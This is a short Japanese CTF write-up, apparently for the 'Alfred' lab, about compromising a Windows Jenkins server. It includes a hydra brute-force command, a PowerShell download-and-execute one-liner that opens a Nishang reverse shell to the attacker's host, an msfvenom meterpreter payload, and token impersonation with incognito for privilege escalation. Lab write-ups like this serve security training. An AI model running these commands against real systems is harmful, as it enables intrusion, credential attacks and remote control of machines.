---
title: "Alfred"
date: 2024-03-16T15:31:32+09:00
draft: false
---

### user.txt

- windows で jenkin が動いている
  - admin admin で通る
  - ```hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.local -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid" -V -t 64 -I```
- Nishang
  - ローカルの ```Invoke-PowerShellTcp.ps1``` があるディレクトリで http サーバを立てる
  - ```nc -nlvp 1234```
  - jenkins の config -> ビルド -> windows パッチコマンドの実行
    - ```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port```
  - build now でリバースシェルがもらえる

### switch shell

- ```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o rv.exe```
- ローカルで ```python3 -m http.server 8001```
- powershell で ```powershell "(New-Object System.Net.WebClient).Downloadfile('http://ip:port/rv.exe','rv.exe')"```
  - ダウンロードしたので実行する前に metasploit で待ち受け準備
    - ```use exploit/multi/handler```
    - ```set PAYLOAD windows/meterpterer/reverse_tcp```
    - ```set LHOST```
    - ```set LPORT```
- リバースシェルから実行 ```. .\rv.exe```

### root

- アクセストークンに関する脆弱性を利用する
  - windwos ではプロセスとスレッドにアクセストークンが結び付けられており，このトークンにより実行するユーザを識別している
  - トークンの情報は以下
    - ユーザ情報：実行するのはだれか
    - グループ情報：ユーザはどこに属しているか
    - 特権情報：何ができるか（どこまで実行できるか）
  - プライマリアクセストークン
    - 全てのプロセスにはプライマリアクセストークンが付いている
    - 子プロセスには親プロセスのトークンが継承される
  - 偽装トークン
    - 親プロセスとは別の情報が設定されたトークンで，別のユーザのトークンをコピーして作成できるオブジェクト
  - 権限借用レベル
    - 偽装トークンでなりすましたユーザとして行える操作範囲の制限がある
      - SecurityImpersonation：ローカルシステムのクライアントのセキュリティコンテキストを偽装できる
      - SecurityDelegation：リモートもローカルもOK
      - 今回はこれを使う
- ```whoami/priv```
  - SeImpersonatePrivilege とかが enable になっている
- ```use incognito```
- ```load incognite```
- list_tokens -g
  - Delegation Tokens Avilabe が見える
  - BUILTIN/Administrator を使う
  - ```getuid```
  - ```impersonate_token "BUILTIN/Administrators"```
  - ```getuid```
- プロセスの移植
  - ```migrate 668```
